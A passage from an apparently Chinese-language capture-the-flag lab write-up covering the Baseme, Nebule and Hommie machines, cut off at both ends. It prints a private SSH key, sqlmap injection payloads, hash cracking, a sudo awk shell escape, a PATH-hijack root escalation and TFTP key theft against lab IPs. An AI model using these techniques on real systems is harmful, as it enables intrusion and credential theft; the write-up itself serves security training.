class="line">YQngA5crv7m/vHhvy+4bnMrSVNXGkMQETx9o+PdRoexrUlRVoOeBMiQJrpUEgK8bQMJx8v</span><br><span class="line">zEcGkJIh+gd+mqY6lZP+lZe8Yje2T8q79JNjsDLwe1KCioJx/cX6Vv0n2TAqEWD14s7lAO</span><br><span class="line">4W6NvUI3uBTLzGGA1qdRWLIJlHCfunH4N9T6exxIR8bXOB+CqfaEJsFipo/SMGBZxUvpig</span><br><span class="line">yLAJLeOGZ4UbgL+nnWPeAjpvzLP1pL4O11OkPBAAAAAwEAAQAAAQBIArRoQOGJh9AMWBS6</span><br><span class="line">oBgUC+lw4Ptq710Q7sOAFMxE7BnEsFZeI62TgZqqpNkdHjr2xuT1ME5YpK5niMzFkkIEd5</span><br><span class="line">SEwK6rKRfUcB3lyZWaoMoIBJ1pZoY1c2qYw1KTb3hVUEbgsmRugIhwWGC+anFfavaJCMDr</span><br><span class="line">nCO2g8VMnT/cTyAv/Qmi8m868KNEzcuzGV5ozHl1XLffHM9R/cqPPyAYaQIa9Z+kS6ou9R</span><br><span class="line">iMTjTSxOPnfh286kgx0ry1se9BBlrEc5251R/PRkEKYrMj3AIwI30qvYlAtNfcCFhoJXLq</span><br><span class="line">vWystPARwiUs7WYBUHRf6bPP/pHTTvwwb2bs51ngImpdAAAAgDaWnQ7Lj7Vp+mTjhSu4oG</span><br><span class="line">ptDHNd2uuqB1+CHRcaVutUmknxvxG3p957UbvNp6e0+ePKtAIakrzbpAo6u25poyWugAuz</span><br><span class="line">X2nQhqsQh6yrThDJlTiDMeV7JNGFbGOcanXXXHt3tjfyrS0+aM87WmwqNyh6nfgy1C5axR</span><br><span class="line">fKZG8ivz5iAAAAgQD83QmCIcbZaCOlGwgHGcuCUDcxGY1QlIRnbM5VAjimNezGFs9f0ExD</span><br><span class="line">SiTwFsmITP//njsbRZP2laiKKO6j4yp5LpfgDB5QHs+g4nXvDn6ns64gCKo7tf2bPP8VCe</span><br><span class="line">FWyc2JyqREwE3WmyhkPlyr9xAZerZ+7Fz+NFueRYzDklWg8wAAAIEAxhBeLqbo6/GUKXF5</span><br><span class="line">rFRatLXI43Jrd9pyvLx62KghsnEBEk7my9sbU5dvYBLztS+lfPCRxV2ZzpjYdN4SDJbXIR</span><br><span class="line">txBaLJe3c4uIc9WjyxGwUK9IL65rSrRVERHsTO525ofPWGQEa2A+pRCpz3A4Y41fy8Y9an</span><br><span class="line">2B2NmfTAfEkWFXsAAAALcm9vdEBiYXNlbWU=</span><br><span class="line">-----END OPENSSH PRIVATE KEY-----</span><br></pre></td></tr></table></figure>

<p>成功登录root</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">└─$ ssh -i id_rsa root@<span class="number">192.168</span><span class="number">.56</span><span class="number">.34</span></span><br><span class="line">Linux baseme <span class="number">4.19</span><span class="number">.0</span>-<span class="number">9</span>-amd64 <span class="comment">#1 SMP Debian 4.19.118-2+deb10u1 (2020-06-07) x86_64</span></span><br><span class="line"></span><br><span class="line">The programs included <span class="keyword">with</span> the Debian GNU/Linux system are free software;</span><br><span class="line">the exact distribution terms <span class="keyword">for</span> each program are described <span class="keyword">in</span> the</span><br><span class="line">individual files <span class="keyword">in</span> /usr/share/doc/*/copyright.</span><br><span class="line"></span><br><span class="line">Debian GNU/Linux comes <span class="keyword">with</span> ABSOLUTELY NO WARRANTY, to the extent</span><br><span class="line">permitted by applicable law.</span><br><span class="line">Last login: Mon Sep <span class="number">28</span> <span class="number">12</span>:<span class="number">47</span>:<span class="number">13</span> <span class="number">2020</span> <span class="keyword">from</span> <span class="number">192.168</span><span class="number">.1</span><span class="number">.59</span></span><br><span class="line">root@baseme:~<span class="comment"># ls</span></span><br><span class="line">root.txt</span><br><span class="line">root@baseme:~<span class="comment"># id</span></span><br><span class="line">uid=<span class="number">0</span>(root) gid=<span class="number">0</span>(root) groups=<span class="number">0</span>(root)</span><br><span class="line">root@baseme:~<span class="comment"># </span></span><br></pre></td></tr></table></figure>

<h2 id="Nebule"><a href="#Nebule" class="headerlink" title="Nebule"></a>Nebule</h2><p>gobuster扫到login和joinus </p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line">┌──(kali㉿kali)-[~/Desktop/baji]</span><br><span class="line">└─$  gobuster <span class="built_in">dir</span> -u http://<span class="number">192.168</span><span class="number">.56</span><span class="number">.35</span> -w /usr/share/seclists/Discovery/Web-Content/directory-<span class="built_in">list</span>-lowercase-<span class="number">2.3</span>-medium.txt -x php,html -t <span class="number">50</span> -e</span><br><span class="line">===============================================================</span><br><span class="line">Gobuster v3<span class="number">.6</span></span><br><span class="line">by OJ Reeves (@TheColonial) &amp; Christian Mehlmauer (@firefart)</span><br><span class="line">===============================================================</span><br><span class="line">[+] Url:                     http://<span class="number">192.168</span><span class="number">.56</span><span class="number">.35</span></span><br><span class="line">[+] Method:                  GET</span><br><span class="line">[+] Threads:                 <span class="number">50</span></span><br><span class="line">[+] Wordlist:                /usr/share/seclists/Discovery/Web-Content/directory-<span class="built_in">list</span>-lowercase-<span class="number">2.3</span>-medium.txt</span><br><span class="line">[+] Negative Status codes:   <span class="number">404</span></span><br><span class="line">[+] User Agent:              gobuster/<span class="number">3.6</span></span><br><span class="line">[+] Extensions:              html,php</span><br><span class="line">[+] Expanded:                true</span><br><span class="line">[+] Timeout:                 10s</span><br><span class="line">===============================================================</span><br><span class="line">Starting gobuster <span class="keyword">in</span> directory enumeration mode</span><br><span class="line">===============================================================</span><br><span class="line">http://<span class="number">192.168</span><span class="number">.56</span><span class="number">.35</span>/.php                 (Status: <span class="number">403</span>) [Size: <span class="number">278</span>]</span><br><span class="line">http://<span class="number">192.168</span><span class="number">.56</span><span class="number">.35</span>/.html                (Status: <span class="number">403</span>) [Size: <span class="number">278</span>]</span><br><span class="line">http://<span class="number">192.168</span><span class="number">.56</span><span class="number">.35</span>/img                  (Status: <span class="number">301</span>) [Size: <span class="number">312</span>] [--&gt; http://<span class="number">192.168</span><span class="number">.56</span><span class="number">.35</span>/img/]</span><br><span class="line">http://<span class="number">192.168</span><span class="number">.56</span><span class="number">.35</span>/login                (Status: <span class="number">301</span>) [Size: <span class="number">314</span>] [--&gt; http://<span class="number">192.168</span><span class="number">.56</span><span class="number">.35</span>/login/]</span><br><span class="line">http://<span class="number">192.168</span><span class="number">.56</span><span class="number">.35</span>/index.php            (Status: <span class="number">200</span>) [Size: <span class="number">3479</span>]</span><br><span class="line">http://<span class="number">192.168</span><span class="number">.56</span><span class="number">.35</span>/joinus               (Status: <span class="number">301</span>) [Size: <span class="number">315</span>] [--&gt; http://<span class="number">192.168</span><span class="number">.56</span><span class="number">.35</span>/joinus/]</span><br><span class="line">http://<span class="number">192.168</span><span class="number">.56</span><span class="number">.35</span>/.php                 (Status: <span class="number">403</span>) [Size: <span class="number">278</span>]</span><br><span class="line">http://<span class="number">192.168</span><span class="number">.56</span><span class="number">.35</span>/.html                (Status: <span class="number">403</span>) [Size: <span class="number">278</span>]</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>login就是登录界面，但是我们没有账号密码</p>
<p>在<a target="_blank" rel="noopener" href="http://192.168.56.35/joinus/application_form.pdf">http://192.168.56.35/joinus/application_form.pdf</a></p>
<p>发现了账号密码</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https://nebulalabs.org/meetings?user=admin&amp;password=d46df8e6a5627debf930f7b5c8f3b083</span><br></pre></td></tr></table></figure>

<p>尝试sql注入</p>
<p>保存下来请求包，sqlmap跑一下</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">[06:<span class="number">18</span>:<span class="number">21</span>] [INFO] the back-end DBMS <span class="keyword">is</span> MySQL</span><br><span class="line">web server operating system: Linux Ubuntu <span class="number">20.04</span> <span class="keyword">or</span> <span class="number">19.10</span> <span class="keyword">or</span> <span class="number">20.10</span> (eoan <span class="keyword">or</span> focal)</span><br><span class="line">web application technology: Apache <span class="number">2.4</span><span class="number">.41</span></span><br><span class="line">back-end DBMS: MySQL &gt;= <span class="number">5.0</span><span class="number">.12</span> (MariaDB fork)</span><br><span class="line">[06:<span class="number">18</span>:<span class="number">21</span>] [INFO] fetching database names</span><br><span class="line">available databases [<span class="number">2</span>]:</span><br><span class="line">[*] information_schema</span><br><span class="line">[*] nebuladb</span><br><span class="line"></span><br><span class="line">[06:<span class="number">18</span>:<span class="number">21</span>] [INFO] fetched data logged to text files under <span class="string">&#x27;/home/kali/.local/share/sqlmap/output/192.168.56.35&#x27;</span></span><br><span class="line"></span><br><span class="line">[*] ending @ 06:<span class="number">18</span>:<span class="number">21</span> /<span class="number">2025</span>-05-<span class="number">20</span>/</span><br></pre></td></tr></table></figure>

<p>提取表数据</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br></pre></td><td class="code"><pre><span class="line">┌──(kali㉿kali)-[~/Desktop/baji]</span><br><span class="line">└─$ sqlmap -r sql.txt -D nebuladb --tables</span><br><span class="line">        ___</span><br><span class="line">       __H__                                                                                                                                                        </span><br><span class="line"> ___ ___[(]_____ ___ ___  &#123;<span class="number">1.9</span><span class="number">.2</span><span class="comment">#stable&#125;                                                                                                                            </span></span><br><span class="line">|_ -| . [<span class="string">&quot;]     | .&#x27;| . |                                                                                                                                           </span></span><br><span class="line"><span class="string">|___|_  [(]_|_|_|__,|  _|                                                                                                                                           </span></span><br><span class="line"><span class="string">      |_|V...       |_|   https://sqlmap.org                                                                                                                        </span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user&#x27;s responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">[*] starting @ 06:19:45 /2025-05-20/</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">[06:19:45] [INFO] parsing HTTP request from &#x27;sql.txt&#x27;</span></span><br><span class="line"><span class="string">[06:19:45] [INFO] resuming back-end DBMS &#x27;mysql&#x27; </span></span><br><span class="line"><span class="string">[06:19:45] [INFO] testing connection to the target URL</span></span><br><span class="line"><span class="string">sqlmap resumed the following injection point(s) from stored session:</span></span><br><span class="line"><span class="string">---</span></span><br><span class="line"><span class="string">Parameter: id (GET)</span></span><br><span class="line"><span class="string">    Type: boolean-based blind</span></span><br><span class="line"><span class="string">    Title: AND boolean-based blind - WHERE or HAVING clause</span></span><br><span class="line"><span class="string">    Payload: id=1&#x27; AND 3962=3962 AND &#x27;GQsF&#x27;=&#x27;GQsF</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">    Type: time-based blind</span></span><br><span class="line"><span class="string">    Title: MySQL &gt;= 5.0.12 AND time-based blind (query SLEEP)</span></span><br><span class="line"><span class="string">    Payload: id=1&#x27; AND (SELECT 9359 FROM (SELECT(SLEEP(5)))iKtL) AND &#x27;GJpV&#x27;=&#x27;GJpV</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">    Type: UNION query</span></span><br><span class="line"><span class="string">    Title: Generic UNION query (NULL) - 3 columns</span></span><br><span class="line"><span class="string">    Payload: id=1&#x27; UNION ALL SELECT CONCAT(0x71707a6a71,0x54664a417a6764626e4e63636d4e6548664565575544466d54434d4b506979695668686856654264,0x716a6b7071),NULL,NULL-- -</span></span><br><span class="line"><span class="string">---</span></span><br><span class="line"><span class="string">[06:19:45] [INFO] the back-end DBMS is MySQL</span></span><br><span class="line"><span class="string">web server operating system: Linux Ubuntu 19.10 or 20.04 or 20.10 (eoan or focal)</span></span><br><span class="line"><span class="string">web application technology: Apache 2.4.41</span></span><br><span class="line"><span class="string">back-end DBMS: MySQL &gt;= 5.0.12 (MariaDB fork)</span></span><br><span class="line"><span class="string">[06:19:45] [INFO] fetching tables for database: &#x27;nebuladb&#x27;</span></span><br><span class="line"><span class="string">Database: nebuladb</span></span><br><span class="line"><span class="string">[3 tables]</span></span><br><span class="line"><span class="string">+----------+</span></span><br><span class="line"><span class="string">| central  |</span></span><br><span class="line"><span class="string">| centrals |</span></span><br><span class="line"><span class="string">| users    |</span></span><br><span class="line"><span class="string">+----------+</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">[06:19:45] [INFO] fetched data logged to text files under &#x27;/home/kali/.local/share/sqlmap/output/192.168.56.35&#x27;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">[*] ending @ 06:19:45 /2025-05-20/</span></span><br></pre></td></tr></table></figure>

<p>dump数据</p>
<p>有效用户凭证cracked password ‘999999999’ for user ‘pmccentral’ </p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">[06:<span class="number">20</span>:<span class="number">56</span>] [INFO] the back-end DBMS <span class="keyword">is</span> MySQL</span><br><span class="line">web server operating system: Linux Ubuntu <span class="number">20.04</span> <span class="keyword">or</span> <span class="number">20.10</span> <span class="keyword">or</span> <span class="number">19.10</span> (eoan <span class="keyword">or</span> focal)</span><br><span class="line">web application technology: Apache <span class="number">2.4</span><span class="number">.41</span></span><br><span class="line">back-end DBMS: MySQL &gt;= <span class="number">5.0</span><span class="number">.12</span> (MariaDB fork)</span><br><span class="line">[06:<span class="number">20</span>:<span class="number">56</span>] [INFO] fetching columns <span class="keyword">for</span> table <span class="string">&#x27;users&#x27;</span> <span class="keyword">in</span> database <span class="string">&#x27;nebuladb&#x27;</span></span><br><span class="line">[06:<span class="number">20</span>:<span class="number">56</span>] [INFO] fetching entries <span class="keyword">for</span> table <span class="string">&#x27;users&#x27;</span> <span class="keyword">in</span> database <span class="string">&#x27;nebuladb&#x27;</span></span><br><span class="line">[06:<span class="number">20</span>:<span class="number">57</span>] [INFO] recognized possible password hashes <span class="keyword">in</span> column <span class="string">&#x27;password&#x27;</span></span><br><span class="line">do you want to store hashes to a temporary file <span class="keyword">for</span> eventual further processing <span class="keyword">with</span> other tools [y/N] y</span><br><span class="line">[06:<span class="number">20</span>:<span class="number">58</span>] [INFO] writing hashes to a temporary file <span class="string">&#x27;/tmp/sqlmapxp3lnri937289/sqlmaphashes-kak8h5bx.txt&#x27;</span> </span><br><span class="line">do you want to crack them via a dictionary-based attack? [Y/n/q] y</span><br><span class="line">[06:<span class="number">20</span>:<span class="number">59</span>] [INFO] using <span class="built_in">hash</span> method <span class="string">&#x27;md5_generic_passwd&#x27;</span></span><br><span class="line">what dictionary do you want to use?</span><br><span class="line">[<span class="number">1</span>] default dictionary file <span class="string">&#x27;/usr/share/sqlmap/data/txt/wordlist.tx_&#x27;</span> (press Enter)</span><br><span class="line">[<span class="number">2</span>] custom dictionary file</span><br><span class="line">[<span class="number">3</span>] file <span class="keyword">with</span> <span class="built_in">list</span> of dictionary files</span><br><span class="line">&gt; <span class="number">1</span></span><br><span class="line">[06:<span class="number">21</span>:<span class="number">28</span>] [INFO] using default dictionary</span><br><span class="line">do you want to use common password suffixes? (slow!) [y/N] y</span><br><span class="line">[06:<span class="number">21</span>:<span class="number">30</span>] [INFO] starting dictionary-based cracking (md5_generic_passwd)</span><br><span class="line">[06:<span class="number">21</span>:<span class="number">30</span>] [INFO] starting <span class="number">2</span> processes </span><br><span class="line">[06:<span class="number">21</span>:<span class="number">30</span>] [INFO] cracked password <span class="string">&#x27;999999999&#x27;</span> <span class="keyword">for</span> user <span class="string">&#x27;pmccentral&#x27;</span>  </span><br></pre></td></tr></table></figure>

<p>登录账户，尝试提权</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">pmccentral@laboratoryuser:/home$ ls</span><br><span class="line">laboratoryadmin  pmccentral</span><br><span class="line">pmccentral@laboratoryuser:/home$ sudo -l</span><br><span class="line">[sudo] password <span class="keyword">for</span> pmccentral: </span><br><span class="line">Matching Defaults entries <span class="keyword">for</span> pmccentral on laboratoryuser:</span><br><span class="line">    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/<span class="built_in">bin</span>\:/usr/sbin\:/usr/<span class="built_in">bin</span>\:/sbin\:/<span class="built_in">bin</span>\:/snap/<span class="built_in">bin</span></span><br><span class="line"></span><br><span class="line">User pmccentral may run the following commands on laboratoryuser:</span><br><span class="line">    (laboratoryadmin) /usr/<span class="built_in">bin</span>/awk</span><br></pre></td></tr></table></figure>

<p>我们可以通过awk以 laboratoryadmin 身份启动一个交互式 Bash shell</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">pmccentral@laboratoryuser:/home$ sudo -u laboratoryadmin /usr/<span class="built_in">bin</span>/awk <span class="string">&#x27;BEGIN &#123;system(&quot;/bin/bash&quot;)&#125;&#x27;</span></span><br><span class="line">laboratoryadmin@laboratoryuser:/home$ <span class="built_in">id</span></span><br><span class="line">uid=<span class="number">1002</span>(laboratoryadmin) gid=<span class="number">1002</span>(laboratoryadmin) groups=<span class="number">1002</span>(laboratoryadmin)</span><br></pre></td></tr></table></figure>

<p>继续找提权思路</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">laboratoryadmin@laboratoryuser:~$ ls</span><br><span class="line">autoScripts  desktop  documents  downloads  home  user.txt</span><br><span class="line">laboratoryadmin@laboratoryuser:~$ cd autoScripts</span><br><span class="line">laboratoryadmin@laboratoryuser:~/autoScripts$ ls</span><br><span class="line">head  PMCEmployees</span><br><span class="line">laboratoryadmin@laboratoryuser:~/autoScripts$ cat head</span><br><span class="line">bash -p</span><br><span class="line"></span><br><span class="line">这里将PMCEmployees提取出来分析</span><br><span class="line">  setuid(<span class="number">0</span>);</span><br><span class="line">  printf(<span class="string">&quot;Showing top 10 best employees of PMC company&quot;</span>);</span><br><span class="line">  <span class="keyword">return</span> system(<span class="string">&quot;head /home/pmccentral/documents/employees.txt&quot;</span>);</span><br></pre></td></tr></table></figure>

<p>环境变量提权</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">laboratoryadmin@laboratoryuser:~/autoScripts$ echo $PATH</span><br><span class="line">/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/snap/bin</span><br><span class="line">laboratoryadmin@laboratoryuser:~/autoScripts$ export PATH=/home/laboratoryadmin/autoScripts:$PATH</span><br><span class="line">laboratoryadmin@laboratoryuser:~/autoScripts$ echo $PATH</span><br><span class="line">/home/laboratoryadmin/autoScripts:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/snap/bin</span><br><span class="line">laboratoryadmin@laboratoryuser:~/autoScripts$ ./PMCEmployees</span><br><span class="line">root@laboratoryuser:~/autoScripts# ls</span><br><span class="line">head  PMCEmployees</span><br><span class="line">root@laboratoryuser:~/autoScripts# cd /root/root.txt</span><br><span class="line">bash: cd: /root/root.txt: Not a directory</span><br><span class="line">root@laboratoryuse</span><br></pre></td></tr></table></figure>

<h2 id="Hommie"><a href="#Hommie" class="headerlink" title="Hommie"></a>Hommie</h2><p>扫端口开了21端口ftp服务，匿名登录后发现可以上传webshell，但是php不解析</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">┌──(kali㉿kali)-[~/Desktop/baji]</span><br><span class="line">└─$ nmap -Pn -n 192.168.56.36</span><br><span class="line">Starting Nmap 7.95 ( https://nmap.org ) at 2025-05-21 22:20 EDT</span><br><span class="line">Nmap scan report for 192.168.56.36</span><br><span class="line">Host is up (0.0042s latency).</span><br><span class="line">Not shown: 997 closed tcp ports (reset)</span><br><span class="line">PORT   STATE SERVICE</span><br><span class="line">21/tcp open  ftp</span><br><span class="line">22/tcp open  ssh</span><br><span class="line">80/tcp open  http</span><br><span class="line">MAC Address: 08:00:27:09:6B:44 (PCS Systemtechnik/Oracle VirtualBox virtual NIC)</span><br><span class="line"></span><br><span class="line">Nmap done: 1 IP address (1 host up) scanned in 0.34 seconds</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>提示alexia用户的id_rsa泄露了</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">┌──(kali㉿kali)-[~/Desktop/baji]</span><br><span class="line">└─$ curl http://<span class="number">192.168</span><span class="number">.56</span><span class="number">.36</span>                                   </span><br><span class="line">alexia, Your id_rsa <span class="keyword">is</span> exposed, please move it!!!!!</span><br><span class="line">Im fighting regarding reverse shells!</span><br><span class="line">-nobody</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>这里扫udp端口看看是不是开启了tftp服务</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">┌──(kali㉿kali)-[~/Desktop/baji]</span><br><span class="line">└─$ nmap -sU -p <span class="number">69</span> <span class="number">192.68</span><span class="number">.56</span><span class="number">.36</span>     </span><br><span class="line">Starting Nmap <span class="number">7.95</span> ( https://nmap.org ) at <span class="number">2025</span>-05-<span class="number">21</span> <span class="number">22</span>:<span class="number">26</span> EDT</span><br><span class="line">Nmap scan report <span class="keyword">for</span> <span class="number">192.68</span><span class="number">.56</span><span class="number">.36</span></span><br><span class="line">Host <span class="keyword">is</span> up (<span class="number">0.00088</span>s latency).</span><br><span class="line"></span><br><span class="line">PORT   STATE         SERVICE</span><br><span class="line"><span class="number">69</span>/udp <span class="built_in">open</span>|filtered tftp</span><br><span class="line"></span><br><span class="line">Nmap done: <span class="number">1</span> IP address (<span class="number">1</span> host up) scanned <span class="keyword">in</span> <span class="number">0.81</span> seconds</span><br><span class="line">                                                                                                                                                                    </span><br><span class="line">┌──(kali㉿kali)-[~/Desktop/baji]</span><br><span class="line">└─$ tftp <span class="number">192.168</span><span class="number">.56</span><span class="number">.36</span></span><br><span class="line">tftp&gt; ls</span><br><span class="line">?Invalid command</span><br><span class="line">tftp&gt; get id_rsa</span><br><span class="line">tftp&gt; </span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>将id_rsa提取到本地，登录ssh</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br></pre></td><td class="code"><pre><span class="line">┌──(kali㉿kali)-[~/Desktop/baji]</span><br><span class="line">└─$ ssh -i id_rsa alexia@<span class="number">192.168</span><span class="number">.56</span><span class="number">.36</span> </span><br><span class="line">Linux hommie <span class="number">4.19</span><span class="number">.0</span>-<span class="number">9</span>-amd64 <span class="comment">#1 SMP Debian 4.19.118-2+deb10u1 (2020-06-07) x86_64</span></span><br><span class="line"></span><br><span class="line">The programs included <span class="keyword">with</span> the Debian GNU/Linux system are free software;</span><br><span class="line">the exact distribution terms <span class="keyword">for</span> each program are described <span class="keyword">in</span> the</span><br><span class="line">individual files <span class="keyword">in</span> /usr/share/doc/*/copyright.</span><br><span class="line"></span><br><span class="line">Debian GNU/Linux comes <span class="keyword">with</span> ABSOLUTELY NO WARRANTY, to the extent</span><br><span class="line">permitted by applicable law.</span><br><span class="line">Last login: Wed May <span class="number">21</span> <span class="number">22</span>:05:<span class="number">36</span> <span class="number">2025</span> <span class="keyword">from</span> <span class="number">192.168</span><span class="number">.56</span><span class="number">.4</span></span><br><span class="line">alexia@hommie:~$ ls</span><br><span class="line">user.txt</span><br><span class="line">alexia@hommie:~$ cat user.txt</span><br><span class="line">Imnotroot</span><br><span class="line">alexia@hommie:~$ find / -perm -u=s -<span class="built_in">type</span> f <span class="number">2</span>&gt;/dev/null</span><br><span class="line">/opt/showMetheKey</span><br><span class="line">/usr/lib/openssh/ssh-keysign</span><br><span class="line">/usr/lib/eject/dmcrypt-get-device</span><br><span class="line">/usr/lib/dbus-<span class="number">1.0</span>/dbus-daemon-launch-helper</span><br><span class="line">/usr/<span class="built_in">bin</span>/gpasswd</span><br><span class="line">/usr/<span class="built_in">bin</span>/chfn</span><br><span class="line">/usr/<span class="built_in">bin</span>/su</span><br><span class="line">/usr/<span class="built_in">bin</span>/mount</span><br><span class="line">/usr/<span class="built_in">bin</span>/chsh</span><br><span class="line">/usr/<span 